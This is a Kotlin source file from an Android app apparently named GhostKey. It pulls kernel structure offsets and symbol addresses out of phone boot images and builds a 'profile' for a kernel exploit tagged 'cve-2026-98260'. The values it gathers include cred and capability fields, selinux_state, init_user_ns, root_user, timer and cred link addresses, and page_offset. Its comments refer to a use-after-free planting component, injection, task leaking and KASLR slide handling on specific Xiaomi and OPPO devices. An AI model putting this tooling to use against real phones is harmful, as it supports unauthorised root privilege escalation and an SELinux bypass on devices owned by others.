package com.EternalTimes.GhostKey.data.ota

import com.EternalTimes.GhostKey.data.ProfileDocument

/**
 * Phase 3 桥接：把 [BootImageParser] 的解析结果映射为通用 [ProfileDocument]。
 *
 * 字段来源（与 PC 端 make.py / offsets.h 的产出对齐，已用 PKJ110_F27 真值回归）：
 *   - BTF（boot.img 即可）：task_cred / task_struct_size / cred_uid
 *   - kallsyms（boot.img 解压后的内核镜像即可，见 [KallsymsExtractor]）：
 *       timer_link   = do_timer_create + 0xa8（make.py:189）
 *       cred_link    = prepare_creds  + 0x24（make.py:190）
 *       selinux_link = selinux_state
 *       user_ns      = init_user_ns
 *       root_user    = root_user
 *       groups       = init_groups
 *       ucounts      = init_ucounts
 *   - 常量：
 *       page_offset  = 0xFFFFFF8000000000（arm64 PAGE_OFFSET）- 0x80000000（SM8750 DRAM 起始）
 *                    = 0xFFFFFF7F80000000（直接映射基址，与 pkj110.conf 一致）
 *       kitimer_node = BTF 实测：k_itimer.it + cpu_timer.node（6.18=0xe0，6.6=0x78）
 *                    ※ 写死 0x78 只对 6.6 成立；6.18 上必须用 BTF 实测值
 *
 * 若某符号在 kallsyms 中缺失（去歧义后未命中），对应字段不写入，
 * 由 [com.EternalTimes.GhostKey.data.ProfileDocument.missingRequiredFields] 回报给用户。
 */
object ImgToProfile {

    /** do_timer_create 内 kmem_cache_alloc 调用点偏移（PC 端 make.py 硬编码）。 */
    private const val TIMER_LINK_INNER_OFFSET = 0xA8L

    /** prepare_creds 内返回指令偏移（PC 端 make.py 硬编码）。 */
    private const val CRED_LINK_INNER_OFFSET = 0x24L

    /*
     * ⚠️ 6.18 的 link 语义与这里**不一致**，别拿这里的输出覆盖仓库里已有的
     * 6.18 profile。
     *
     * 实测（2026-11-02，小米 OS4.0.27.0 港版 OTA 的 boot.img，与仓库 6.18
     * profile 的 _image_sha256 逐字相同）：
     *   仓库 profile : timer_link = do_timer_create + 0x0  ← 符号**起始**地址
     *                  cred_link  = prepare_creds  + 0x0
     *   这里生成     : timer_link = do_timer_create + 0xa8
     *                  cred_link  = prepare_creds  + 0x24
     * 差的就是下面这两个 make.py 的函数内偏移（6.6 时代的假设）。slide_addr()
     * 会把它当成符号地址直接加 slide，于是偏 0xa8 / 0x24。
     *
     * 6.18 的运行时解析走 calib_a 的「符号名匹配」而不是这些 link 值，所以
     * 注入本身不受影响；但导出的 profile 若被别的路径当权威值用就会出错。
     */

    /**
     * copy_process 内 `kmem_cache_alloc_node(task_struct_cachep, …)` 的返回地址偏移。
     *
     * 6.6.x 的 copy_process 在最开头内联 dup_task_struct，反汇编实测
     * （小米 ab16143355 与 OPPO abogki537459655 两张 6.6.118 完全一致）：
     *   +0x138  ldr  x0, [task_struct_cachep]
     *   +0x13c  bl   kmem_cache_alloc_node
     *   +0x140  ← tracepoint 记录的 _RET_IP_
     * 只对 6.6.x 生效（见下方 gate）；其他内核留空，`leak_task()` 自动退回尺寸匹配。
     */
    private const val TASK_ALLOC_INNER_OFFSET = 0x140L

    /** arm64 PAGE_OFFSET（0xFFFFFF8000000000 的有符号补码位模式）。 */
    private const val PAGE_OFFSET = -0x8000000000L

    /** SM8750/PKJ110 DRAM 起始物理地址。 */
    private const val DRAM_PHYS_START = 0x80000000L

    /**
     * kitimer_node 兜底值：6.6 的 0x78（src/uaf_plant.c 编译期覆盖值）。
     *
     * 仅在 BTF 里取不到 k_itimer/cpu_timer 布局时使用；
     * 正常路径一律用 BTF 实测值（6.18 是 0xe0，不是 0x78）。
     */
    private const val KITIMER_NODE_FALLBACK = 0x78L

    fun toProfileDocument(
        info: BootImageParser.ExtractedKernelInfo,
        imageFileName: String,
    ): Pair<ProfileDocument, List<String>> {
        val release = info.release?.takeIf { it.isNotBlank() }
            ?: "unknown-${info.imageSha256.take(8)}"

        val offset = LinkedHashMap<String, Any?>()
        info.structOffsets?.taskStruct?.let { ts ->
            offset["task_cred"] = ts.cred
            offset["task_struct_size"] = ts.size
        }
        info.structOffsets?.cred?.let { cr ->
            offset["cred_uid"] = cr.uid
        }
        info.credLayout?.let { layout ->
            val m = layout.memberOffsets
            offset["cred_size"] = layout.size
            m["cap_inheritable"]?.let { offset["cred_cap_inheritable"] = it }
            m["cap_permitted"]?.let { offset["cred_cap_permitted"] = it }
            m["cap_effective"]?.let { offset["cred_cap_effective"] = it }
            m["cap_bset"]?.let { offset["cred_cap_bset"] = it }
            m["cap_ambient"]?.let { offset["cred_cap_ambient"] = it }
            m["security"]?.let { offset["cred_security"] = it }
            m["user"]?.let { offset["cred_user"] = it }
            m["user_ns"]?.let { offset["cred_user_ns"] = it }
            m["ucounts"]?.let { offset["cred_ucounts"] = it }
            m["group_info"]?.let { offset["cred_groups"] = it }
        }
        info.structOffsets?.kItimerSize?.let { offset["kitimer_size"] = it }

        val syms = info.symbols
        if (syms != null) {
            syms["do_timer_create"]?.let { offset["timer_link"] = it + TIMER_LINK_INNER_OFFSET }
            syms["prepare_creds"]?.let { offset["cred_link"] = it + CRED_LINK_INNER_OFFSET }
            syms["selinux_state"]?.let { offset["selinux_link"] = it }
            syms["init_user_ns"]?.let { offset["user_ns"] = it }
            syms["root_user"]?.let { offset["root_user"] = it }
            syms["init_groups"]?.let { offset["groups"] = it }
            syms["init_ucounts"]?.let { offset["ucounts"] = it }
            if (release.startsWith("6.6.")) {
                syms["copy_process"]?.let { offset["task_alloc_link"] = it + TASK_ALLOC_INNER_OFFSET }
            }
        }

        // kitimer_node = k_itimer.it 的偏移 + cpu_timer.node 的偏移（6.18=0xe0，6.6=0x78）
        val kitimerNode = run {
            val it = info.kItimerLayout?.memberOffsets?.get("it")
            val node = info.cpuTimerLayout?.memberOffsets?.get("node")
            if (it != null && node != null) it + node else null
        }
        offset["kitimer_node"] = kitimerNode ?: KITIMER_NODE_FALLBACK

        val fields = LinkedHashMap<String, Any?>()
        fields["release"] = release
        fields["vuln_type"] = "cve-2026-98260"
        fields["recommend_shizuku"] = 1
        fields["page_offset"] = PAGE_OFFSET - DRAM_PHYS_START
        if (offset.isNotEmpty()) fields["offset"] = offset
        fields["_source"] = "img:$imageFileName"
        fields["_image_sha256"] = info.imageSha256
        if (info.notes.isNotEmpty()) {
            fields["_img_notes"] = info.notes.joinToString("; ")
        }

        val doc = ProfileDocument(release = release, fields = fields)
        return doc to doc.missingRequiredFields()
    }
}
